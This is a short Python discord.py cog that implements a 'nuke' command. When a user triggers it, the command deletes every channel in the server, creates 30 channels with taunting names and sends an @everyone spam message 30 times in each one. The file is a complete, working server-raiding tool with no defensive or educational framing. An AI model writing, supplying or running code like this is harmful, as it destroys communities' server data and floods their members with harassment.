from discord.ext import commands
import discord
import asyncio

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="nuke")
    async def nuke(self, ctx: commands.Context):
        guild = ctx.guild
        await ctx.message.delete()

        # delete all channels
        delete_coros = [ch.delete() for ch in guild.channels]
        await asyncio.gather(*delete_coros, return_exceptions=True)

        # create 30 channels with alternating names
        names = ["🤡NexoFast-to-Fast🤡", "💀imagine-getting-nuked💀"]
        create_coros = [guild.create_text_channel(names[i % 2]) for i in range(30)]
        created = await asyncio.gather(*create_coros, return_exceptions=True)

        # filter only successfully created text channels
        text_channels = [ch for ch in created if isinstance(ch, discord.TextChannel)]

        # spam each channel 30 times
        spam_coros = []
        for ch in text_channels:
            for _ in range(30):
                spam_coros.append(ch.send("@everyone NexoFast on Top"))
        await asyncio.gather(*spam_coros, return_exceptions=True)

async def setup(bot):
    await bot.add_cog(Nuke(bot))
